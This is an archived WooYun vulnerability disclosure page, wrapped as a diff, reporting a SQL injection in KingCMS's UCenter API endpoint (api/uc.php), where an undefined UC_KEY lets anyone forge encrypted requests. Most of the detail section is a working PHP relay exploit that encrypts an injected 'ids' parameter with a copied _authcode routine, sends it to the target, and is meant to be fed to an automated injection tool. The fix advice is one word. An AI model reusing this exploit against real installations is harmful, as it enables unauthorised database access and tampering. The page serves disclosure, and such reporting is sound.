@@ -1,0 +1,264 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		kingcms最新版sql注入漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		kingcms最新版sql注入漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/Matt">Matt</a> 
+</li><li>提交时间：		2013-11-21 13:00</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-11-21：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2014-02-19：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">kingcms 注入漏洞</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail"></p><pre><code>api/uc.php<br />
+UC_KEY没有初始化导致注入<br />
+<br />
+&lt;?php<br />
+<br />
+define(&#039;UC_CLIENT_VERSION&#039;, &#039;1.5.0&#039;);	//note UCenter 版本标识<br />
+define(&#039;UC_CLIENT_RELEASE&#039;, &#039;20090502&#039;);<br />
+<br />
+define(&#039;API_DELETEUSER&#039;, 1);		//note 用户删除 API 接口开关<br />
+define(&#039;API_RENAMEUSER&#039;, 1);		//note 用户改名 API 接口开关<br />
+define(&#039;API_GETTAG&#039;, 1);		//note 获取标签 API 接口开关<br />
+define(&#039;API_SYNLOGIN&#039;, 1);		//note 同步登录 API 接口开关<br />
+define(&#039;API_SYNLOGOUT&#039;, 1);		//note 同步登出 API 接口开关<br />
+define(&#039;API_UPDATEPW&#039;, 1);		//note 更改用户密码 开关<br />
+define(&#039;API_UPDATEBADWORDS&#039;, 1);	//note 更新关键字列表 开关<br />
+define(&#039;API_UPDATEHOSTS&#039;, 1);		//note 更新域名解析缓存 开关<br />
+define(&#039;API_UPDATEAPPS&#039;, 1);		//note 更新应用列表 开关<br />
+define(&#039;API_UPDATECLIENT&#039;, 1);		//note 更新客户端缓存 开关<br />
+define(&#039;API_UPDATECREDIT&#039;, 0);		//note 更新用户积分 开关<br />
+define(&#039;API_GETCREDITSETTINGS&#039;, 0);	//note 向 UCenter 提供积分设置 开关<br />
+define(&#039;API_GETCREDIT&#039;, 0);		//note 获取用户的某项积分 开关<br />
+define(&#039;API_UPDATECREDITSETTINGS&#039;, 0);	//note 更新应用积分设置 开关<br />
+<br />
+define(&#039;API_RETURN_SUCCEED&#039;, &#039;1&#039;);<br />
+define(&#039;API_RETURN_FAILED&#039;, &#039;-1&#039;);<br />
+define(&#039;API_RETURN_FORBIDDEN&#039;, &#039;-2&#039;);<br />
+<br />
+define(&#039;KC_INDEX&#039;,True);<br />
+define(&#039;KC_CALL_FUNC&#039;,True);<br />
+<br />
+require_once &#039;../global.php&#039;;//加载KingCMS<br />
+<br />
+$king-&gt;load(&#039;user&#039;);//加载用户类<br />
+//note 普通的 http 通知方式<br />
+	error_reporting(0);<br />
+	restore_error_handler();<br />
+	set_magic_quotes_runtime(0);<br />
+	define(&#039;ROOT&#039;, substr(dirname(__FILE__), 0, -3));<br />
+	defined(&#039;MAGIC_QUOTES_GPC&#039;) || define(&#039;MAGIC_QUOTES_GPC&#039;, get_magic_quotes_gpc());<br />
+	define(&#039;UC_CLIENT_ROOT&#039;, ROOT.&#039;user/client/&#039;);<br />
+<br />
+	$_DCACHE = $get = $post = array();<br />
+//解码传入参数<br />
+	$code = @$_GET[&#039;code&#039;];<br />
+	//var_dump(UC_KEY);<br />
+	parse_str(_authcode($code, &#039;DECODE&#039;, UC_KEY), $get);//这里没有DEF UC_KEY 所以直接把UC_KEY作为一个字符串传入<br />
+	if(MAGIC_QUOTES_GPC) {<br />
+		$get = _stripslashes($get);<br />
+	}<br />
+这样我们就能执行UC API来进行注入了<br />
+<br />
+写一个中转程序进行注入<br />
+<br />
+<br />
+<br />
+代码如下<br />
+<br />
+<br />
+&lt;?php<br />
+    $timestamp = time()+10*3600;<br />
+    $host=&quot;127.0.0.1&quot;;<br />
+    $uc_key=&quot;UC_KEY&quot;;<br />
+    $code=urlencode(_authcode(&quot;time=999999999999999999999999&amp;ids=1) and 1={$_GET[&#039;id&#039;]} and 1 =(1&amp;action=deleteuser&quot;, &#039;ENCODE&#039;, $uc_key));<br />
+	echo file_get_contents(&quot;http://127.0.0.1//kingcms/api/uc.php?code={$code}&quot;);<br />
+	<br />
+   function _authcode($string, $operation = &#039;DECODE&#039;, $key = &#039;&#039;, $expiry = 0) {<br />
+    $ckey_length = 4;<br />
+<br />
+    $key = md5($key ? $key : UC_KEY);<br />
+    $keya = md5(substr($key, 0, 16));<br />
+    $keyb = md5(substr($key, 16, 16));<br />
+    $keyc = $ckey_length ? ($operation == &#039;DECODE&#039; ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : &#039;&#039;;<br />
+<br />
+    $cryptkey = $keya.md5($keya.$keyc);<br />
+    $key_length = strlen($cryptkey);<br />
+<br />
+    $string = $operation == &#039;DECODE&#039; ? base64_decode(substr($string, $ckey_length)) : sprintf(&#039;%010d&#039;, $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;<br />
+    $string_length = strlen($string);<br />
+<br />
+    $result = &#039;&#039;;<br />
+    $box = range(0, 255);<br />
+<br />
+    $rndkey = array();<br />
+    for($i = 0; $i &lt;= 255; $i++) {<br />
+        $rndkey[$i] = ord($cryptkey[$i % $key_length]);<br />
+    }<br />
+<br />
+    for($j = $i = 0; $i &lt; 256; $i++) {<br />
+        $j = ($j + $box[$i] + $rndkey[$i]) % 256;<br />
+        $tmp = $box[$i];<br />
+        $box[$i] = $box[$j];<br />
+        $box[$j] = $tmp;<br />
+    }<br />
+<br />
+    for($a = $j = $i = 0; $i &lt; $string_length; $i++) {<br />
+        $a = ($a + 1) % 256;<br />
+        $j = ($j + $box[$a]) % 256;<br />
+        $tmp = $box[$a];<br />
+        $box[$a] = $box[$j];<br />
+        $box[$j] = $tmp;<br />
+        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));<br />
+    }<br />
+<br />
+    if($operation == &#039;DECODE&#039;) {<br />
+        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {<br />
+            return substr($result, 26);<br />
+        } else {<br />
+                return &#039;&#039;;<br />
+            }<br />
+    } else {<br />
+        return $keyc.str_replace(&#039;=&#039;, &#039;&#039;, base64_encode($result));<br />
+    }}<br />
+?&gt;<br />
+保存为1.php<br />
+利用方法<br />
+http://127.0.0.1/x.php?id=1<br />
+丢到大萝卜里面跑就OKl饿<br />
+&lt;code&gt;</code></pre><p class='detail'>&lt;/code&gt; </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/20201457c36e50e8e41ed0df2b42596c3f514c43.png" target="_blank"><img src="../images/20201457c36e50e8e41ed0df2b42596c3f514c43.png" alt="QQ截图20131106230233.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">过滤 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/Matt" title="Matt">Matt</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-043520" title="kingcms最新版sql注入漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																	
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="43520";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
